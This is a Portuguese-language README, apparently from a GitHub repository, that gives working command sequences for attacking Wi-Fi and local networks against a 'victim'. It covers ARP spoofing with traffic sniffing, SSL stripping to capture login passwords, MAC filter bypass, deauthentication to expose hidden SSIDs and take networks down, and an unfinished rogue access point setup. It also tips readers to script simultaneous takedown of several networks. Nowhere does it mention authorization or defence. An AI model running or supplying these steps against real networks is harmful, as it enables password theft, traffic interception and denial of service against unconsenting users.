> Adaptador: TP-LINK TL-WN722N V1
- É obrigatório que seu adaptador tenha Modo de monitoramento e Injeção de pacotes

![tplink-tl-wn722n 454A5022a-1024](https://user-images.githubusercontent.com/33843748/100901218-5deb9a80-34a2-11eb-9740-4ea483a7f5a1.jpg)

#### O que é AP, SSID, CH e MAC ?
- AP significa Access Point ou Ponto de Acesso... neste caso, seria o roteador

- SSID é o nome da rede Wifi

- CH, Channel ou Canal, é onde o AP está sendo propagado

- Dispositivos que se conectam à rede, possui um código único assim que saem da fábrica, esse código se chama MAC ou MAC Address e é utilizado para que a rede tenha um falso controle de acesso... digo falso porque é possível burlar esse controle, alterando o endereço MAC

#### wlan0, at0 e eth0

Ao conectar o adaptador pela primeira vez, notei que o nome não seguia os "padrões" de nomes de adaptadores, então eu optei por trocar para wlan0

- at0 é a interface de monitoramento do adaptador... é por ela que a vítima irá se conectar à rede falsa
- eth0 é a placa de rede do computador

### ARP Spoofing

Consiste em envenenar a tabela ARP do roteador da vítima, a fim de desviar o tráfego para a máquina atacante, fingindo ser o gateway e capiturando os dados

Habilite o IP Forwarding

> echo 1 > /proc/sys/net/ipv4/ip_forward

ou

> sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'

Para ver se foi habilitado, digite o comando:

> cat /proc/sys/net/ipv4/ip_forward

> sudo arpspoof -i eth0 -t ( IP da vítima ) ( IP do Gateway )

Abra outro terminal

Abra o Wireshark e selecione rede local eth0, depois clique no ícone de start

Procure pelos pacotes HTTP e fareje !!!

### Descobrindo senhas ( ARP Spoofing e SSL Strip )

> arpspoof -i eth0 -t ( IP da vítima ) ( IP do gateway )

Abra outro terminal e habilite o IP Forwarding

> echo 1 > /proc/sys/net/ipv4/ip_forward

Crie a regra de forma que todo tráfego direcionado como porta 80, seja redirecionado para uma porta, exemplo: 1337

> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1337

> cd /pentest/web/sslstrip

> python sslstrip.py -p -l 1337

Abra outro terminal

> cd /pentest/web/sslstrip

> tail -f sslstrip.log

Acesse algum site que utilize SSL e tente fazer o login

### Burlando filtro de MAC ( MAC Spoofing )

O AP pode ser configurado para limitar quem pode se conectar a ele pelo filtro de MAC

Isso pode ser burlado através do clone de endereço MAC

> airmon-ng start wlan0

> airodump-ng wlan0

Escolha um MAC conectado na rede da vítima ( exibidos em STATION )

> ifconfig wlan0 down

> macchanger --mac ( MAC ) wlan0

> ifconfig wlan0 up

### Descobrindo SSID escondido ( Deauth Attack )

> airmon-ng start wlan0

> airodump-ng wlan0

Abra outro terminal e feche o anterior

> airodump-ng -c ( CH do AP ) wlan0

> aireplay-ng -0 2 -a MAC wlan0

O SSID será exibido no terminal anterior

### Derrubando rede wireless
- O roteador da vítima precisa ser de 2.4 GHz

> ifconfig wlan0 down

> iwconfig wlan0 mode monitor

> ifconfig wlan0 up

> airmon-ng start wlan0

> airodump-ng wlan0

> airodump-ng wlan0 -c ( CH do AP ) --bssid ( MAC )

Abra outro terminal
> aireplay-ng -0 0 -a ( MAC ) wlan0

- Uma dica: crie um script que derrube várias redes ao mesmo tempo

### Ataque MITM ( Fake AP, Rogue AP )
- Tive problemas em realizar este ataque... em breve irei atualizar

> apt install isc-dhcp-server

> nano /etc/dhcp/dhcpd.conf

Substitua o contéudo do arquivo por:

```
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 10.0.1.0 netmask 255.255.255.0 {
    option subnet-mask 255.255.255.0;
    option broadcast-address 10.0.1.255;
    option routers 10.0.1.1;
    option domain-name-servers 8.8.8.8;
    range 10.0.1.100 10.0.1.175;
}
```

> nano /etc/network/interfaces

> auto eth0

> iface eth0 inet dhcp

> ifconfig wlan0 down

> iwconfig wlan0 mode monitor

> iwconfig wlan0 channel 11

> ifconfig wlan0 up

> airmon-ng start wlan0

> airmon-ng check kill ( NetworkManager start se cair a conexão )

> airbase-ng -c 11 -e ( SSID DA VÍTIMA ) -P wlan0

> ifconfig at0 up 10.0.1.1/24 mtu 1400

> route add -net 10.0.1.0 netmask 255.255.255.0 gw 10.0.1.1

> echo 1 > /proc/sys/net/ipv4/ip_forward

> echo > /var/lib/dhcp/dhcpd.leases

> rm /var/run/dhcpd.pid

> dhcpd -t -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0

> service isc-dhcp-server start
